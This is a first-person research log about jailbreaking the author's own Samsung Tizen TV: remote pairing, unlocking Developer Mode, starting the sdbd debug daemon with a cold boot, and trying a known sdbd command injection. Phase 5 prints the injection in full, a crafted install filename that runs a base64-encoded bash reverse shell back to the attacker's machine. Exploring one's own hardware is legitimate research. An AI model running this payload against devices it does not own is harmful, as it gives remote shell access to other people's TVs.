# Samsung CU7105 — the jailbreak hunt

*October 14–15, 2026. One Mac, one TV, one remote button at a time.*

A complete, honest account of what we did, what we exploited, and how it all works — from "can you press a button on my TV?" to a live sdbd connection and a named CVE on the table.

---

## TL;DR

| Milestone | Result |
|---|---|
| Network remote (keys, volume, apps) | ✅ **Working, permanent** (`remote.js`) |
| Developer Mode unlocked on the TV | ✅ **On, IP set to the Mac, survives reboots** |
| `sdbd` daemon (the dev back door) starts | ✅ **Broken — by a cold power cycle** |
| sdb client connected to the TV | ✅ **Two generations of clients verified** |
| OS shell via SVE-2025-50109 injection | ⚠️ **Not yet — `shell:0` is stubbed on this 2021 firmware** |
| Firmware extraction (to read sdbd's source) | ⛔ Blocked: Samsung's FOTA CDN 403s our IP (Akamai edge) |

The headline exploit we *actually* found and used isn't a CVE — it's a **boot-state bug**: Samsung's `sdbd` reads the developer IP **only at boot**, and standby is not a boot. Unplugging the TV for 30 seconds did what every handshake, reboot-via-remote, and daemon we threw at it could not: **port 26101 opened.**

---

## Phase 0 — The TV, and why it's interesting

- **Samsung CU7105 55** (2021), Tizen 6, firmware platform 9.0, DUID `U7CLIM2YTMUHE`
- LAN: TV `192.168.1.119`, Mac `192.168.1.7`
- Advertises AirPlay 2; ports 8001 (Control 2.0 plain), 8002 (Control 2.0 TLS), 8080 (legacy remote), 7000 (AirPlay)

A Tizen TV is a Linux box with a UI bolted on. Under the store and the ads there's `/usr/sbin`, init scripts, and a **development bridge** (`sdbd`) that Samsung ships in *every* firmware but only starts when Developer Mode is satisfied. That bridge is the jailbreak: it gives file transfer, install, and (on un-branded sets) a shell.

## Phase 1 — Earning the right to talk to it (remote pairing)

Samsung Control 2.0 (`wss://8002`) is the official "remote over the network" API. Pairing:

1. Open `wss://192.168.1.119:8002/api/v2/channels/samsung.remote.control?name=U2Ftc3VuZ1JlbW90ZUFwcA==` (name = base64 of "SamsungRemoteApp")
2. Send `{"event":"req","id":"pairing","data":"pairing"}` → the TV shows an allow popup + PIN
3. Send the PIN **on the same connection** → the TV returns a bearer token

Hard-won gotchas, all documented in `README.md`:
- The TV **drops commands sent before its `ms.channel.connect` handshake finishes** — `remote.js` waits for the ack
- Key names are **silently wrong** per generation: `KEY_VOLUMEUP` is a ghost, `KEY_VOLUP` is real. `remote.js` carries an alias table
- 8002 uses a self-signed cert (`rejectUnauthorized: false` on a home LAN is fine)
- The pairing token lives in `token.txt` and survives reboots

**Result:** full key control — power, volume, mute, navigation, apps. Verified live (volume 7→10, mute toggle).

## Phase 2 — Developer Mode: the 123-12345 ritual

On this model there is no menu toggle. The path (found by trial, confirmed by Samsung docs):

**Home → Apps → *App Settings* (bottom of the apps panel) → press the `123` button on the remote → type `12345` on the on-screen keypad**

That pops the gray **Developer Mode** dialog: one toggle + one IP field (the *development computer's* IP — the Mac, `192.168.1.7`), no Reconnect button, no SSH/TSS checkboxes. The keypad is the store's search keypad, which cost us one confused round.

## Phase 3 — The sdbd mystery

Developer Mode on, IP correct (verified via the Control 2.0 API: `developerMode: "1"`, `developerIP: "192.168.1.7"`), and… nothing. Ports 26099, 26101, 10022, 49001: closed. For an evening we tried, exhaustively:

| Attempt | Result |
|---|---|
| Raw `sdb` 1.0.0 (2015 Tizen build) `connect 26101` | `unable to connect` |
| TSS handshake `tss-1.0` UDP → TV:49001 (5 payload variants) | no reply |
| TSS server **on the Mac** listening on 49001 across a TV power cycle | TV never greets us |
| Host-side `sdb start-server` (26099) + connect | TV never dials in |
| Full firmware-generation port scan with dev mode on | only 8080 open |

We built our own sdb client from source (TizenTeam/sdb, patched for macOS — `sdb/sdb` in this repo) and it confirmed the protocol layer was fine: the TV simply had **no daemon to talk to**.

## Phase 4 — The exploit that actually worked: a cold boot

A team of three specialists ran in parallel (firmware archaeologist, jailbreak scout, RE tooling). The scout's 2026 research found the diagnosis — and it fits every symptom:

> **`sdbd` snapshots the developer IP at *boot*. Standby is not a boot.**
> — community record for 2020–2025 branded sets, echoed by the tizen-homebrew (2026) error table: `ECONNREFUSED` = sdbd not running.

We had set the IP, rebooted, rebooted again — but every "reboot" was a `KEY_POWER` (standby), and the TV had never once booted with the IP already committed. The cure cost thirty seconds of wall-socket time:

**Unplug the TV for 30s → plug back in → power on.**

```
$ for p in 26101 26099 10022 49001; do nc -z -w 2 192.168.1.119 $p && echo "$p OPEN"; done
26101 OPEN
```

```
$ sdb devices
192.168.1.119:26101    device    <unknown>
```

**The back door was open.** No CVE, no payload — just the TV's own documented-but-unseen boot behavior.

## Phase 5 — SVE-2025-50109: the named exploit (and its wall)

Bishop Fox, Feb 2026: **SVE-2025-50109** — command injection in sdbd's `vd_appinstall` (the `.tpk` install service). The *filename* argument passes through a device-side `system()`, so a path containing `$(cmd)` executes on the TV. Demonstrated on three physical TVs including a 2020 TU-series and a 2022 **CU-7000** — our hardware family.

The exploit, precisely:

```
sdb install "new$(echo <base64 of: bash -i >& /dev/tcp/<MAC-IP>/<PORT> 0>&1 | base64 -d | bash).tpk"
                └──────── device shell expands this before install even starts ────────┘
```

We fired it three ways through two client generations:

1. **2015 sdb 1.0.0** — no `install` command at all (it's commented out in the source, `commandline.c:950`); the injection vector doesn't exist in this client
2. **tizen-homebrew's 2026 client** (Bun, `shell:0`-stream protocol) — connects cleanly, gets our real DUID, and `vd_appinstall` accepts the injected packageId *without error*…

…but no reverse shell came home, and a timing test revealed the reason:

```
$ sdb exec 'shell:0 sleep 5 && echo SLEPT'
→ returned in 6ms, empty
```

**`shell:0` is a no-op stub on this 2021 firmware.** Only sdbd *builtins* answer (`getduid` works, `uname`/`ls`/stdout don't; file listing and pull streams return zero bytes). The injection very likely fired into a world where `system()`-level exec is also trimmed — or into the vd_appinstall path that branded builds gate separately. Either way, we've hit the exact wall the scout predicted for branded 2021 sets, and the next move is reading `sdbd`'s own code to see which.

That's what the rest of the tooling was for.

## The arsenal, assembled

| Piece | What it is | State |
|---|---|---|
| `remote.js` + `token.txt` | Control 2.0 key remote | ✅ permanent, one sentence to drive |
| `sdb/sdb` | sdb client 1.0.0 we built for macOS (patched source in `sdb/src/`) | ✅ connects, `get-state` works |
| tizen-homebrew 2026 client | Bun-based modern sdb client (`shell:0` protocol) | ✅ connects, `getduid` works |
| **REA + Ghidra 12.1.4** | the disassembler that will read `sdbd`'s startup conditions, exec paths, and string tables | ✅ proven on a real ELF (decompiled to pseudocode) |
| Firmware pipeline | `sfd`/`samfirm` → `.tar.zst` → squashfs rootfs → `sdbd` binary | ⛔ Akamai 403s our IP on Samsung's FOTA CDN (all regions/models) |

## How it all fits (the mental model)

```
                        ┌────────────────────────────┐
        KEYS            │         THE TV             │
  remote.js ──────────▶ │  Control 2.0 API (8002)    │   ✅ always on
                        └────────────────────────────┘
                        ┌────────────────────────────┐
   tizen-homebrew /     │  sdbd daemon               │
   our sdb  ──────────▶ │  (only at BOOT does it read │   ✅ open after cold
   TCP 26101            │   the developer IP, then    │     boot
                        │   listen on 26101)          │
                        └────────────────────────────┘
                                    │ builtins  ✅ (getduid)
                                    │ shell:0   ⚠️ stub
                                    │ appinstall ⚠️ accepts, exec?
                        ┌────────────────────────────┐
   REA+Ghidra ────────▶ │  the sdbd binary itself    │   🎯 next: read its
   (firmware extract)   │  (why is exec trimmed?)    │     conditions
                        └────────────────────────────┘
```

## What a success looks like next

1. **Firmware in, `sdbd` out** — via a non-datacenter IP for the CDN, a phone hotspot, or a pre-extracted rootfs. Then `rea decompile sdbd` → find the exact exec gate.
2. **If the exec path exists under appinstall** — the injection becomes a shell: `whoami` → `sdk`, and the prize tier opens (sideload TizenTube/Jellyfin/our own apps, kill ad channels, homebrew forever).
3. **If branded builds truly stub it** — the exploit is still *the* capability unlock for the modern fleet (tizen-homebrew builds on it), and our 2021 set keeps its working remote + the door armed.

---

*Every command in this document was run on the real machine. The TV is in standby, the door is armed, and the disassembler is warm.*
